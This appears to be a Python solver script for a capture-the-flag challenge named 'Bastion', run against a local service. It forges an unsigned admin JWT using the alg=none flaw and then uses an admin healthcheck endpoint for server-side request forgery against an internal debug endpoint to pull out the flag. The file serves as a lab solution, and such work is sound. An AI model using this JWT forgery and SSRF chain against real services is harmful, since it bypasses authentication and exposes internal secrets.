"""Solver for Bastion CTF challenge."""
# Obviously not actually it's patched... I think...
import base64
import json
import re
import requests

BASE = "http://127.0.0.1:6705"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_admin_token():
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"sub": "admin", "role": "admin"}).encode())
    return f"{header}.{payload}."


def main():
    # Step 1: Login as guest to verify the service is up
    r = requests.post(f"{BASE}/api/login", json={"username": "guest", "password": "guest"})
    print(f"[*] Guest login: {r.status_code}")
    assert r.status_code == 200, f"Login failed: {r.text}"

    # Step 2: Forge admin JWT with alg=none
    token = forge_admin_token()
    print(f"[*] Forged token: {token[:60]}...")

    # Step 3: SSRF via healthcheck to hit internal debug endpoint
    r = requests.post(
        f"{BASE}/api/admin/healthcheck",
        json={"url": "http://127.0.0.1:9999/internal/debug/env"},
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"[*] Healthcheck response: {r.status_code}")
    data = r.json()

    # Step 4: Extract flag
    flag = data.get("body", "")
    m = re.search(r"aprilfools\{[^}]+\}", flag)
    if m:
        print(f"[+] Flag: {m.group(0)}")
    else:
        print(f"[-] Flag not found in response: {data}")


if __name__ == "__main__":
    main()
